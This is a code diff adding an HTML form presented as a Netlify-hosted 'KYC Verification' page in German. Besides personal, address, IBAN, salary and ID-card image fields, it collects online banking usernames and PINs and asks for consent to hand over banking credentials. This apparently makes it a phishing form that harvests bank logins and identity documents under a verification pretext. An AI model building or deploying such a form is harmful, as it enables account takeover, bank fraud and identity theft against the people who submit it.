@@ -1,0 +1,58 @@
+<!-- Netlify Forms Configuration - Save this in public folder for Netlify deployment -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>KYC Verification Form</title>
+</head>
+<body>
+  <form name="kyc-verification" method="POST" netlify>
+    <!-- Personal Information -->
+    <input type="text" name="firstName" />
+    <input type="text" name="lastName" />
+    <input type="date" name="dateOfBirth" />
+    <input type="text" name="placeOfBirth" />
+    <input type="tel" name="phoneNumber" />
+
+    <!-- Address Information -->
+    <input type="text" name="street" />
+    <input type="text" name="houseNumber" />
+    <input type="text" name="postalCode" />
+    <input type="text" name="town" />
+
+    <!-- Financial Information -->
+    <input type="text" name="iban" />
+    <input type="text" name="bankName" />
+    <select name="bankRelationship">
+      <option value="under1">Unter 1 Jahr</option>
+      <option value="1to2">1-2 Jahre</option>
+      <option value="3to5">3-5 Jahre</option>
+      <option value="over5">Über 5 Jahre</option>
+    </select>
+    <input type="text" name="occupation" />
+    <select name="monthlySalary">
+      <option value="under1000">Unter 1.000€</option>
+      <option value="1000to2500">1.000€ - 2.500€</option>
+      <option value="2500to4000">2.500€ - 4.000€</option>
+      <option value="4000to6000">4.000€ - 6.000€</option>
+      <option value="over6000">Über 6.000€</option>
+    </select>
+    <input type="radio" name="housingStatus" value="tenant" />
+    <input type="radio" name="housingStatus" value="owner" />
+
+    <!-- Identity Verification -->
+    <input type="file" name="idFront" />
+    <input type="file" name="idBack" />
+
+    <!-- Bank Access -->
+    <input type="text" name="onlineBankingUsername" />
+    <input type="password" name="onlineBankingPin" />
+
+    <!-- Consent -->
+    <input type="checkbox" name="dataProcessingConsent" />
+    <input type="checkbox" name="bankingCredentialsConsent" />
+
+    <!-- Honeypot -->
+    <input type="text" name="bot-field" style="display: none;" />
+  </form>
+</body>
+</html>
